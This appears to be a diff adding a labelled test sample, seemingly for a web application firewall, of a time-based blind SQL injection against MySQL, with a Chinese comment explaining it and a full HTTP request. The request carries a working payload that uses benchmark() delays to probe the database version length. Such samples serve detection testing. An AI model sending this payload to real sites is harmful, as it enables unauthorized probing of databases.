@@ -1,0 +1,9 @@
+# SQL注入_GET_mysql_延时注入-06506264
+# 基于延时注入,该 SQL 注入语句的攻击目的是通过利用数据库的漏洞，检查数据库版本号的长度是否为 8。如果条件为真，那么它会执行子查询 (select benchmark(10000000,md5(0x41))) 进行基准测试，以测试数据库的性能和响应时间。通过这种方式，攻击者可以确定数据库的版本号长度为 8，并利用已知的针对该特定版本的漏洞进行进一步的攻击。
+GET /?id=1%20and%20if%28length%28version%28%29%29=8%2C%28select%20benchmark%2810000000%2Cmd5%280x41%29%29%29%2C0%29&bid=hd_tag_m8mv24cp HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24cp
+RM-PRO-Token: 5a9f4d7702604c6aabbdc6136b867b5c
+RM-PRO-Time: 1742808374868
+User-Agent: curl/7.83.1
+
